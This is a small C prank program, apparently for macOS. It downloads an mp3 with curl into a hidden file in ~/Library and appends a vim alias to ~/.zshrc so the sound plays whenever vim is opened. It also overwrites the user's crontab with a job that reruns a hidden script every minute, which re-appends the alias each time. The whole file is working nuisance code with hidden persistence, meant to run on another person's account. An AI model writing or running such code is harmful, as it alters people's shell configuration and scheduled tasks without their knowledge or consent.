#include <stdlib.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>
#include <stdio.h>

int	main()
{
	int	fd;
	int	fd2;

	if ((fd = open("./.pacman", O_RDWR | O_CREAT, 0644)) < 0)
	{
		perror("open 1");
		exit(1);
	}
	if ((fd2 = open("./.lol", O_RDWR | O_CREAT, 0644)) < 0)
	{
		perror("open 2");
		exit(1);
	}		
	char	*str = "echo 'alias vim=\"afplay $HOME/Library/.257.mp3 && vim\"' >> ~/.zshrc";
	char	*str2 = "* * * * * sh ~/Library/.pacman\n";

	write(fd, str, strlen(str));
	write(fd2, str2, strlen(str2));
	close(fd);
	close(fd2);
	system("curl -o ~/Library/.257.mp3 http://s1download-universal-soundbank.com/mp3/sounds/257.mp3");

	system("echo 'alias vim=\"afplay $HOME/Library/.257.mp3 && vim\"' >> ~/.zshrc");
	system("cp ./.pacman ~/Library/.pacman && crontab < ./.lol && rm .lol .pacman");
	return (0);
}
